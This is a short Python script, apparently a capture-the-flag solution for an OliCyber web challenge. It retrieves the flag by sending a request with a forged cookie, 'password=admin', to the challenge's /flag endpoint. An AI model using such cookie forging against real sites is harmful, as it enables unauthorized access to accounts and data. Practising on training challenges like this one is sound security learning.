#!/usr/bin/python3
#script made by LunarStone292

import requests as r
from colorama import Fore

uri = "http://web-05.challs.olicyber.it/flag"
cookies = dict(password='admin')

def main():
    message = r.get(uri, cookies=cookies).text
    return message

if __name__ == "__main__":
    message = main()
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag: " + Fore.YELLOW + message + Fore.RESET)
